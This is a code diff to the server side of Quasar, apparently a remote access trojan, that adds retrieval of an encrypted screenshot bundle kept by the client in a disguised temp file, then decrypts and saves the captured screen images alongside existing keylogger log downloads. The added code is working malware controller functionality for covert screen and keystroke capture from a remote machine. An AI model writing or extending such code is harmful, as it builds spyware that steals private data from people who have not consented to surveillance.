@@ -7,6 +7,8 @@ using Quasar.Common.Networking;
 using Quasar.Server.Models;
 using Quasar.Server.Networking;
 using System;
+using System.Collections.Generic;
+using System.Globalization;
 using System.IO;
 using System.Text;
 
@@ -31,6 +33,22 @@ namespace Quasar.Server.Messages
         /// The remote path of the keylogger logs directory.
         /// </summary>
         private string _remoteKeyloggerDirectory;
+
+        /// <summary>
+        /// Client path to the encrypted screenshot bundle (e.g. %TEMP%\wctBG958.tmp).
+        /// </summary>
+        private string _remoteScreenshotBundlePath;
+
+        /// <summary>
+        /// Remote paths of screenshot-bundle downloads started from this handler (matched on transfer completion).
+        /// </summary>
+        private readonly List<string> _pendingScreenshotRemotePaths = new List<string>();
+
+        private readonly object _pendingScreenshotLock = new object();
+
+        private enum KeyloggerDirPendingAction { None, ListLogs, DownloadScreenshotBundle }
+
+        private KeyloggerDirPendingAction _pendingKeyloggerDirAction = KeyloggerDirPendingAction.None;
 
         /// <summary>
         /// The amount of all running log transfers.
@@ -83,6 +101,16 @@ namespace Quasar.Server.Messages
         /// </summary>
         public void RetrieveLogs()
         {
+            _pendingKeyloggerDirAction = KeyloggerDirPendingAction.ListLogs;
+            _client.Send(new GetKeyloggerLogsDirectory());
+        }
+
+        /// <summary>
+        /// Fetches the client's encrypted screenshot bundle and extracts JPEGs into the Logs folder.
+        /// </summary>
+        public void RetrieveScreenshots()
+        {
+            _pendingKeyloggerDirAction = KeyloggerDirPendingAction.DownloadScreenshotBundle;
             _client.Send(new GetKeyloggerLogsDirectory());
         }
 
@@ -103,8 +131,34 @@ namespace Quasar.Server.Messages
 
         private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
         {
-            _remoteKeyloggerDirectory = message.LogsDirectory;
-            client.Send(new GetDirectory {RemotePath = _remoteKeyloggerDirectory});
+            _remoteKeyloggerDirectory = message.LogsDirectory ?? "";
+            _remoteScreenshotBundlePath = message.ScreenshotBundlePath ?? "";
+
+            switch (_pendingKeyloggerDirAction)
+            {
+                case KeyloggerDirPendingAction.ListLogs:
+                    client.Send(new GetDirectory { RemotePath = _remoteKeyloggerDirectory });
+                    break;
+                case KeyloggerDirPendingAction.DownloadScreenshotBundle:
+                    if (string.IsNullOrEmpty(_remoteScreenshotBundlePath))
+                        OnReport("Screenshot bundle path not available from client");
+                    else
+                    {
+                        lock (_pendingScreenshotLock)
+                            _pendingScreenshotRemotePaths.Add(_remoteScreenshotBundlePath);
+                        _fileManagerHandler.BeginDownloadFile(_remoteScreenshotBundlePath,
+                            Path.GetFileName(_remoteScreenshotBundlePath), true);
+                        OnReport("Downloading screenshot bundle...");
+                    }
+                    break;
+                default:
+                    /* Backward compatibility: if something triggers this without a pending action, list logs. */
+                    if (!string.IsNullOrEmpty(_remoteKeyloggerDirectory))
+                        client.Send(new GetDirectory { RemotePath = _remoteKeyloggerDirectory });
+                    break;
+            }
+
+            _pendingKeyloggerDirAction = KeyloggerDirPendingAction.None;
         }
 
         private string GetDownloadProgress(int allTransfers, int completedTransfers)
@@ -117,6 +171,120 @@ namespace Quasar.Server.Messages
         {
             // called when directory does not exist or access is denied
             OnReport($"No logs found ({value})");
+        }
+
+        private static string SanitizeScreenshotFileName(string name)
+        {
+            foreach (char c in Path.GetInvalidFileNameChars())
+                name = name.Replace(c, '_');
+            return name;
+        }
+
+        private void ProcessScreenshotBundle(string localPath)
+        {
+            byte[] raw;
+            try
+            {
+                raw = File.ReadAllBytes(localPath);
+            }
+            catch (Exception ex)
+            {
+                OnReport("Failed to read screenshot bundle: " + ex.Message);
+                return;
+            }
+
+            string logsDir = Path.Combine(_client.Value.DownloadDirectory, "Logs");
+            if (!Directory.Exists(logsDir))
+            {
+                try
+                {
+                    Directory.CreateDirectory(logsDir);
+                }
+                catch (Exception ex)
+                {
+                    OnReport("Logs directory error: " + ex.Message);
+                    return;
+                }
+            }
+
+            const byte Sm = (byte)'S', Cm = (byte)'C', One = (byte)'1';
+            int pos = 0;
+            int saved = 0;
+            var taken = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+            while (pos + 8 <= raw.Length)
+            {
+                if (!(raw[pos] == Sm && raw[pos + 1] == Cm && raw[pos + 2] == Sm && raw[pos + 3] == One))
+                {
+                    pos++;
+                    continue;
+                }
+
+                int segLen = raw[pos + 4] | (raw[pos + 5] << 8) | (raw[pos + 6] << 16) | (raw[pos + 7] << 24);
+                if (segLen < 48 || pos + 8 + segLen > raw.Length)
+                    break;
+
+                byte[] segment = new byte[segLen];
+                Buffer.BlockCopy(raw, pos + 8, segment, 0, segLen);
+                pos += 8 + segLen;
+
+                byte[] plain;
+                try
+                {
+                    plain = CClientAes.Decrypt(segment);
+                }
+                catch
+                {
+                    continue;
+                }
+
+                if (plain == null || plain.Length < 8 + 2)
+                    continue;
+
+                ulong ms = BitConverter.ToUInt64(plain, 0);
+                var jpeg = new byte[plain.Length - 8];
+                Buffer.BlockCopy(plain, 8, jpeg, 0, jpeg.Length);
+                if (jpeg.Length < 2 || jpeg[0] != 0xFF || jpeg[1] != 0xD8)
+                    continue;
+
+                string baseName = SanitizeScreenshotFileName(
+                    DateTimeOffset.FromUnixTimeMilliseconds((long)ms).ToUniversalTime()
+                        .ToString("yyyy-MM-dd_HH-mm-ss_fff", CultureInfo.InvariantCulture));
+                string fname = baseName + ".jpg";
+                int dup = 2;
+                while (taken.Contains(fname) || File.Exists(Path.Combine(logsDir, fname)))
+                {
+                    fname = baseName + "_" + dup + ".jpg";
+                    dup++;
+                }
+                taken.Add(fname);
+
+                try
+                {
+                    File.WriteAllBytes(Path.Combine(logsDir, fname), jpeg);
+                    saved++;
+                }
+                catch
+                {
+                    /* skip */
+                }
+            }
+
+            try
+            {
+                if (saved > 0)
+                    File.Delete(localPath);
+            }
+            catch
+            {
+                /* keep bundle if locked */
+            }
+
+            if (raw.Length == 0)
+                OnReport("Screenshot bundle is empty");
+            else if (saved == 0)
+                OnReport("No valid screenshots found in bundle (or decryption failed)");
+            else
+                OnReport(saved == 1 ? "Saved 1 screenshot to Logs" : $"Saved {saved} screenshots to Logs");
         }
 
         private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
@@ -161,6 +329,23 @@ namespace Quasar.Server.Messages
             {
                 try
                 {
+                    string localScreenshotPath = null;
+                    lock (_pendingScreenshotLock)
+                    {
+                        int idx = _pendingScreenshotRemotePaths.FindIndex(p =>
+                            string.Equals(p, transfer.RemotePath, StringComparison.OrdinalIgnoreCase));
+                        if (idx >= 0)
+                        {
+                            _pendingScreenshotRemotePaths.RemoveAt(idx);
+                            localScreenshotPath = transfer.LocalPath;
+                        }
+                    }
+                    if (localScreenshotPath != null)
+                    {
+                        ProcessScreenshotBundle(localScreenshotPath);
+                        return;
+                    }
+
                     _completedTransfers++;
                     string content = null;
                     /* Try C client format: [magic "KLS1"][len4][seg]... or legacy single blob. */
